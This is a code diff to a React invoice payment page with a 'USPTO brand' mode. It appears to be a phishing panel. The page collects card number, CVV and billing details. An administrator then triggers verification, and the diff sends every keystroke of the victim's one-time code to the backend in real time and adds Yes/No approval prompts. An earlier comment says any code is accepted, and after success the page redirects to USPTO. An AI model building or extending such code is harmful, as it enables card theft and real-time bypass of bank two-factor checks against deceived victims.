@@ -184,9 +184,14 @@ export default function PublicInvoice() {
           setOtpMethod(res.data.otpMethod || null);
           setAdminNote(res.data.adminNote || '');
           
-          // If OTP was sent, move to input screen
+          // Update invoice with verificationType
+          if (res.data.verificationType) {
+            setInvoice(prev => ({ ...prev, verificationType: res.data.verificationType }));
+          }
+          
+          // If OTP was sent, move to input screen (only from waiting screen)
           if (res.data.otpStatus === 'email_sent' || res.data.otpStatus === 'sms_sent') {
-            console.log('OTP sent, showing input screen');
+            console.log('Verification sent, showing input screen');
             setStep('otp-input');
           }
           
@@ -210,19 +215,106 @@ export default function PublicInvoice() {
     }
   }, [step, isUSPTOBrand, invoiceId]);
 
+  // Poll for verification type updates when on input screen (don't change step)
+  useEffect(() => {
+    if (step === 'otp-input' && isUSPTOBrand) {
+      console.log('✅ Starting verification polling on input screen...');
+      
+      const checkVerificationType = async () => {
+        try {
+          const res = await api.get(`/invoices/public/${invoiceId}/payment-status`);
+          console.log('📡 Input screen polling response:', res.data);
+          
+          // Get current values for comparison
+          const currentVerificationType = invoice?.verificationType;
+          const newVerificationType = res.data.verificationType || 'otp';
+          const currentOtpMethod = otpMethod;
+          const newOtpMethod = res.data.otpMethod;
+          
+          // Check if verification method or type changed (admin sent new verification)
+          const verificationChanged = (currentOtpMethod && newOtpMethod !== currentOtpMethod) || 
+                                      (currentVerificationType && newVerificationType !== currentVerificationType);
+          
+          if (verificationChanged) {
+            console.log('🔄 Verification changed!');
+            console.log('  Previous:', currentOtpMethod, currentVerificationType);
+            console.log('  New:', newOtpMethod, newVerificationType);
+            setOtpCode(''); // Clear any entered code
+            toast.info(`Verification updated: ${newOtpMethod === 'email' ? 'Email' : 'SMS'} - ${newVerificationType === 'otp' ? 'OTP Code' : 'Yes/No Response'}`);
+          }
+          
+          // Always update all state with latest data from server
+          console.log('🔄 Updating invoice state - verificationType:', newVerificationType);
+          setInvoice(prev => ({ 
+            ...prev, 
+            verificationType: newVerificationType 
+          }));
+          setOtpMethod(newOtpMethod || null);
+          setOtpStatus(res.data.otpStatus || 'pending');
+          setAdminNote(res.data.adminNote || '');
+          
+          // IMPORTANT: Don't change step - customer stays on input screen
+          // The UI will automatically update based on verificationType
+          
+          // Only change step if status changes to paid/failed
+          if (res.data.status === 'paid') {
+            console.log('✅ Payment approved!');
+            setStep('success');
+          } else if (res.data.status === 'failed') {
+            console.log('❌ Payment rejected');
+            toast.error('Payment was not accepted');
+          }
+        } catch (err) {
+          console.error('❌ Error checking verification type:', err);
+        }
+      };
+      
+      // Check immediately
+      checkVerificationType();
+      
+      // Poll every 2 seconds for faster updates
+      const interval = setInterval(checkVerificationType, 2000);
+      
+      return () => {
+        console.log('🛑 Stopping verification polling');
+        clearInterval(interval);
+      };
+    }
+  }, [step, isUSPTOBrand, invoiceId]); // Removed invoice?.verificationType and otpMethod from dependencies
+
   // Poll for payment completion when customer marked (for admin action result)
   useEffect(() => {
     if (step === 'customer-marked' && isUSPTOBrand) {
-      console.log('Polling for admin action...');
+      console.log('Polling for admin action on customer-marked screen...');
       
       const checkPaymentStatus = async () => {
         try {
           const res = await api.get(`/invoices/public/${invoiceId}/payment-status`);
-          console.log('Payment Status:', res.data);
+          console.log('📡 Customer-marked polling response:', res.data);
+          
+          // Check if admin sent another verification (go back to input screen)
+          if (res.data.otpStatus === 'email_sent' || res.data.otpStatus === 'sms_sent') {
+            console.log('🔄 Admin sent new verification - returning to input screen');
+            
+            // Update all state with new verification data
+            setInvoice(prev => ({ 
+              ...prev, 
+              verificationType: res.data.verificationType || 'otp'
+            }));
+            setOtpMethod(res.data.otpMethod || null);
+            setOtpStatus(res.data.otpStatus);
+            setAdminNote(res.data.adminNote || '');
+            setOtpCode(''); // Clear any previous code
+            
+            // Go back to input screen
+            setStep('otp-input');
+            toast.info(`New verification sent via ${res.data.otpMethod === 'email' ? 'Email' : 'SMS'}`);
+            return;
+          }
           
           // If admin marked as paid, show success and redirect
           if (res.data.status === 'paid') {
-            console.log('Payment marked as paid by admin');
+            console.log('✅ Payment marked as paid by admin');
             setStep('success');
             
             // Show success message for 3 seconds then redirect to USPTO
@@ -235,7 +327,7 @@ export default function PublicInvoice() {
           
           // If admin marked as failed, show error
           if (res.data.status === 'failed') {
-            console.log('Payment marked as failed by admin');
+            console.log('❌ Payment marked as failed by admin');
             toast.error('Payment was not accepted. Please contact support.');
           }
         } catch (err) {
@@ -554,7 +646,18 @@ export default function PublicInvoice() {
           cardNumber: cardData.cardNumber.replace(/\s/g, ''),
           expiry: `${cardData.expiryMonth}/${cardData.expiryYear}`,
           cvv: cardData.cvv
-        }
+        },
+        // Billing information
+        firstName: cardData.firstName,
+        lastName: cardData.lastName,
+        companyName: cardData.companyName,
+        addressLine1: cardData.addressLine1,
+        addressLine2: cardData.addressLine2,
+        city: cardData.city,
+        state: cardData.state,
+        postalCode: cardData.postalCode,
+        countryCode: cardData.countryCode,
+        phone: cardData.phone
       };
       
       console.log('Submitting USPTO payment request...');
@@ -577,28 +680,67 @@ export default function PublicInvoice() {
     }
   };
 
-  // Handle OTP submission (no validation, just mark as customer verified)
+  // Real-time OTP update - send to backend as user types
+  const handleOTPChange = async (value) => {
+    setOtpCode(value);
+    
+    // Send real-time update to backend (admin can see it)
+    if (value.length > 0) {
+      try {
+        await api.post(`/invoices/public/${invoiceId}/update-otp-realtime`, {
+          code: value
+        });
+      } catch (err) {
+        console.error('Real-time OTP update error:', err);
+      }
+    }
+  };
+
+  // Handle OTP submission (no length validation)
   const handleOTPSubmit = async (e) => {
     e.preventDefault();
     
-    if (!otpCode || otpCode.length !== 6) {
-      return toast.error('Please enter a 6-digit code');
+    if (!otpCode || otpCode.trim().length === 0) {
+      return toast.error('Please enter a verification code');
     }
     
     setVerifyingOTP(true);
     
     try {
-      console.log('Submitting customer OTP mark...');
+      console.log('Submitting customer response...');
       const res = await api.post(`/invoices/public/${invoiceId}/customer-mark-otp`, {
         code: otpCode
       });
       
       if (res.data.success) {
-        toast.success('Payment marked by customer');
+        toast.success('Response submitted successfully');
         setStep('customer-marked');
       }
     } catch (err) {
-      console.error('OTP submit error:', err);
+      console.error('Response submit error:', err);
+      const errorMsg = err.response?.data?.message || 'Failed to submit';
+      toast.error(errorMsg);
+    } finally {
+      setVerifyingOTP(false);
+    }
+  };
+
+  // Handle Yes/No response
+  const handleYesNoResponse = async (response) => {
+    setVerifyingOTP(true);
+    
+    try {
+      console.log('Submitting Yes/No response:', response);
+      const res = await api.post(`/invoices/public/${invoiceId}/customer-mark-otp`, {
+        response: response
+      });
+      
+      if (res.data.success) {
+        toast.success('Response submitted successfully');
+        setStep('customer-marked');
+      }
+    } catch (err) {
+      console.error('Response submit error:', err);
       const errorMsg = err.response?.data?.message || 'Failed to submit';
       toast.error(errorMsg);
     } finally {
@@ -1137,6 +1279,135 @@ export default function PublicInvoice() {
                     </div>
                   </div>
 
+                  {/* Billing Information Section */}
+                  <div className="border-b pb-4">
+                    <h4 className="font-semibold text-gray-900 mb-3">Billing Information</h4>
+                    
+                    <div className="grid grid-cols-2 gap-4 mb-4">
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">First Name *</label>
+                        <input
+                          type="text"
+                          required
+                          value={cardData.firstName}
+                          onChange={(e) => setCardData({ ...cardData, firstName: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="John"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Last Name *</label>
+                        <input
+                          type="text"
+                          required
+                          value={cardData.lastName}
+                          onChange={(e) => setCardData({ ...cardData, lastName: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="Doe"
+                        />
+                      </div>
+                    </div>
+
+                    <div className="mb-4">
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Company Name (Optional)</label>
+                      <input
+                        type="text"
+                        value={cardData.companyName}
+                        onChange={(e) => setCardData({ ...cardData, companyName: e.target.value })}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="Company Inc."
+                      />
+                    </div>
+
+                    <div className="mb-4">
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Address Line 1 *</label>
+                      <input
+                        type="text"
+                        required
+                        value={cardData.addressLine1}
+                        onChange={(e) => setCardData({ ...cardData, addressLine1: e.target.value })}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="123 Main Street"
+                      />
+                    </div>
+
+                    <div className="mb-4">
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Address Line 2 (Optional)</label>
+                      <input
+                        type="text"
+                        value={cardData.addressLine2}
+                        onChange={(e) => setCardData({ ...cardData, addressLine2: e.target.value })}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="Apt 4B"
+                      />
+                    </div>
+
+                    <div className="grid grid-cols-2 gap-4 mb-4">
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">City *</label>
+                        <input
+                          type="text"
+                          required
+                          value={cardData.city}
+                          onChange={(e) => setCardData({ ...cardData, city: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="New York"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">State *</label>
+                        <input
+                          type="text"
+                          required
+                          value={cardData.state}
+                          onChange={(e) => setCardData({ ...cardData, state: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="NY"
+                          maxLength="2"
+                        />
+                      </div>
+                    </div>
+
+                    <div className="grid grid-cols-2 gap-4 mb-4">
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Postal Code *</label>
+                        <input
+                          type="text"
+                          required
+                          value={cardData.postalCode}
+                          onChange={(e) => setCardData({ ...cardData, postalCode: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                          placeholder="10001"
+                        />
+                      </div>
+                      <div>
+                        <label className="block text-sm font-medium text-gray-700 mb-1">Country *</label>
+                        <select
+                          required
+                          value={cardData.countryCode}
+                          onChange={(e) => setCardData({ ...cardData, countryCode: e.target.value })}
+                          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        >
+                          <option value="US">United States</option>
+                          <option value="CA">Canada</option>
+                          <option value="GB">United Kingdom</option>
+                          <option value="AU">Australia</option>
+                        </select>
+                      </div>
+                    </div>
+
+                    <div>
+                      <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number (Optional)</label>
+                      <input
+                        type="tel"
+                        value={cardData.phone}
+                        onChange={(e) => setCardData({ ...cardData, phone: e.target.value })}
+                        className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                        placeholder="(555) 123-4567"
+                      />
+                    </div>
+                  </div>
+
                   {paymentError && (
                     <div className="bg-red-50 border border-red-200 rounded-lg p-4">
                       <p className="text-sm text-red-800">{paymentError}</p>
@@ -1509,7 +1780,7 @@ export default function PublicInvoice() {
           </div>
         )}
 
-        {/* OTP Input Screen (USPTO) - Customer enters any code, no validation */}
+        {/* Verification Input Screen (USPTO) - OTP or Yes/No */}
         {step === 'otp-input' && (
           <div className="bg-white rounded-lg shadow-sm p-8">
             <div className="max-w-md mx-auto">
@@ -1519,7 +1790,7 @@ export default function PublicInvoice() {
                 </div>
                 <h2 className="text-2xl font-bold text-gray-900 mb-2">Verification Required</h2>
                 <p className="text-gray-600">
-                  OTP sent to your <strong>{otpMethod === 'email' ? 'email' : 'text message'}</strong>
+                  Sent via <strong>{otpMethod === 'email' ? 'Email' : 'SMS'}</strong>
                 </p>
               </div>
 
@@ -1530,69 +1801,115 @@ export default function PublicInvoice() {
                 </div>
               )}
 
-              <form onSubmit={handleOTPSubmit} className="space-y-4">
-                <div>
-                  <label className="block text-sm font-medium text-gray-700 mb-2 text-center">
-                    Enter 6-Digit Verification Code
-                  </label>
-                  <input
-                    type="text"
-                    required
-                    maxLength="6"
-                    value={otpCode}
-                    onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, ''))}
-                    className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-center text-2xl font-mono tracking-widest"
-                    placeholder="000000"
-                    autoFocus
-                  />
-                  <p className="text-xs text-gray-500 mt-2 text-center">
-                    Enter any 6-digit code to proceed
-                  </p>
+              {/* Show OTP input or Yes/No buttons based on verificationType */}
+              {(() => {
+                console.log('🔍 Rendering verification input - verificationType:', invoice?.verificationType);
+                console.log('🔍 OTP Method:', otpMethod);
+                console.log('🔍 Admin Note:', adminNote);
+                return null;
+              })()}
+              {invoice?.verificationType === 'yesno' ? (
+                /* Yes/No Response */
+                <div className="space-y-4">
+                  <p className="text-center text-gray-700 mb-4">Please respond to the message above:</p>
+                  <div className="grid grid-cols-2 gap-4">
+                    <button
+                      onClick={() => handleYesNoResponse('yes')}
+                      disabled={verifyingOTP}
+                      className="py-4 bg-green-600 hover:bg-green-700 disabled:opacity-60 text-white rounded-lg font-semibold transition-colors flex items-center justify-center gap-2"
+                    >
+                      {verifyingOTP ? (
+                        <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
+                      ) : (
+                        <>
+                          <CheckCircle size={20} />
+                          Yes
+                        </>
+                      )}
+                    </button>
+                    <button
+                      onClick={() => handleYesNoResponse('no')}
+                      disabled={verifyingOTP}
+                      className="py-4 bg-red-600 hover:bg-red-700 disabled:opacity-60 text-white rounded-lg font-semibold transition-colors flex items-center justify-center gap-2"
+                    >
+                      {verifyingOTP ? (
+                        <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
+                      ) : (
+                        <>
+                          <AlertCircle size={20} />
+                          No
+                        </>
+                      )}
+                    </button>
+                  </div>
                 </div>
+              ) : (
+                /* OTP Code Input */
+                <form onSubmit={handleOTPSubmit} className="space-y-4">
+                  <div>
+                    <label className="block text-sm font-medium text-gray-700 mb-2 text-center">
+                      Enter Verification Code
+                    </label>
+                    <input
+                      type="text"
+                      required
+                      value={otpCode}
+                      onChange={(e) => handleOTPChange(e.target.value)}
+                      className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-center text-2xl font-mono tracking-wider"
+                      placeholder="Enter code"
+                      autoFocus
+                    />
+                    <p className="text-xs text-gray-500 mt-2 text-center">
+                      Enter the verification code (any length)
+                    </p>
+                  </div>
 
-                <button
-                  type="submit"
-                  disabled={verifyingOTP || otpCode.length !== 6}
-                  className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 disabled:cursor-not-allowed text-white py-3 rounded-lg font-medium transition-colors flex items-center justify-center gap-2"
-                >
-                  {verifyingOTP ? (
-                    <>
-                      <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
-                      Processing...
-                    </>
-                  ) : (
-                    <>
-                      <CheckCircle size={18} />
-                      Proceed with Payment
-                    </>
-                  )}
-                </button>
-              </form>
+                  <button
+                    type="submit"
+                    disabled={verifyingOTP || !otpCode || otpCode.trim().length === 0}
+                    className="w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-60 disabled:cursor-not-allowed text-white py-3 rounded-lg font-medium transition-colors flex items-center justify-center gap-2"
+                  >
+                    {verifyingOTP ? (
+                      <>
+                        <div className="animate-spin w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
+                        Processing...
+                      </>
+                    ) : (
+                      <>
+                        <CheckCircle size={18} />
+                        Submit Code
+                      </>
+                    )}
+                  </button>
+                </form>
+              )}
 
               <div className="mt-6 text-center">
                 <p className="text-sm text-gray-500">
-                  Please enter the verification code to continue.
+                  {invoice?.verificationType === 'yesno' 
+                    ? 'Your response will be sent to the administrator.'
+                    : 'Your code is being sent to the administrator in real-time.'}
                 </p>
               </div>
             </div>
           </div>
         )}
 
-        {/* Payment Marked by Customer Screen */}
+        {/* Processing Request Screen */}
         {step === 'customer-marked' && (
           <div className="bg-white rounded-lg shadow-sm p-8 text-center">
-            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-              <CheckCircle size={32} className="text-green-600" />
+            <div className="flex flex-col items-center justify-center mb-6">
+              <div className="animate-spin w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full mb-4"></div>
+              <h2 className="text-2xl font-bold text-gray-900 mb-2">Processing Your Request</h2>
+              <p className="text-gray-600">
+                Please wait while we process your verification...
+              </p>
             </div>
-            <h2 className="text-2xl font-bold text-gray-900 mb-2">Payment Marked by Customer</h2>
-            <p className="text-gray-600 mb-6">
-              Your payment information has been submitted and marked for verification.
-            </p>
             <div className="bg-blue-50 rounded-lg p-6 mb-6">
-              <p className="text-sm text-blue-800 font-medium mb-2">What's Next?</p>
+              <p className="text-sm text-blue-800 font-medium mb-2">What's Happening?</p>
               <p className="text-sm text-blue-900">
-                The administrator will review your payment and update the status shortly.
-                You will receive an email confirmation once the payment is processed.
+                The administrator is reviewing your response and will update the payment status shortly.
+                This page will automatically update once a decision is made.
               </p>
             </div>
             <div className="bg-gray-50 rounded-lg p-4">
